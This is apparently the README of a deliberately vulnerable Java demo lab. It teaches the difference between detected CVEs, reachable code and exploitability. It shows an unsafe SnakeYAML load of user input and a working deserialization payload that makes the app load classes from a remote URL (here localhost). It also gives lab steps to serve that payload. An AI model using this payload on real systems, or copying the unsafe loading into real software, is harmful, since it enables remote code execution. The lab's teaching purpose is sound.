# Vulnerable Demo App - README

## Overview

This project is a deliberately vulnerable Java Maven application
designed to study: 
- SBOM + CVE detection
- Reachability analysis
- Exploitability

------------------------------------------------------------------------

## Vulnerable Dependencies

### 1. SnakeYAML (1.17)

-   **Issue**: Arbitrary object deserialization
-   **Status**: ✅ Reachable
-   **Status**: ✅ Exploitable

Used in:

``` java
Yaml yaml = new Yaml();
Object obj = yaml.load(yamlStr);
```

When input comes from `args[0]`, this becomes dangerous.

------------------------------------------------------------------------

### 2. Jackson Databind (2.9.0)

-   Many historical CVEs
-   ❌ Not exploitable here (safe usage)

------------------------------------------------------------------------

### 3. Commons-Collections (3.2.1)

-   Deserialization gadgets
-   ❌ Not used → not reachable

------------------------------------------------------------------------

### 4. Log4j (2.13.3)

-   Vulnerable version range (Log4Shell family)
-   ❌ Not used → not exploitable

------------------------------------------------------------------------

### 5. Commons-IO, Guava, HttpClient, Spring

-   Older versions
-   ❌ Not directly exploitable in this code

------------------------------------------------------------------------

## REAL VULNERABILITY

### Entry Point

``` bash
java -cp target/... com.demo.App exploit.yaml
```

### Vulnerable Code

``` java
yamlExample2(String yamlStr) {
    Yaml yaml = new Yaml();
    yaml.load(yamlStr);
}
```

------------------------------------------------------------------------

## Exploit

### exploit.yaml

``` yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://localhost:8000/"]
  ]]
]
```

------------------------------------------------------------------------

## Attack Flow

1.  App loads YAML from user input
2.  SnakeYAML instantiates dangerous classes
3.  Remote URL is fetched
4.  Potential remote code execution

------------------------------------------------------------------------

## Lab Tutorial

### Step 1 --- Start malicious server

``` bash
python3 -m http.server 8000
```

### Step 2 --- Run vulnerable app

``` bash
mvn compile
mvn exec:java -Dexec.args="exploit.yaml"
```

### Expected Result

The app will contact:

    http://localhost:8000/

------------------------------------------------------------------------

## Key Takeaways

-   SBOM tools detect *potential* vulnerabilities
-   Reachability determines if code is used
-   Exploitability requires user-controlled input

👉 In this project: - Many CVEs detected ❌ - Few reachable ⚠️ - One
truly exploitable ✅

------------------------------------------------------------------------

## Goal of This Lab

Understand the difference between:
- Dependency vulnerability
- Reachability
- Exploitability
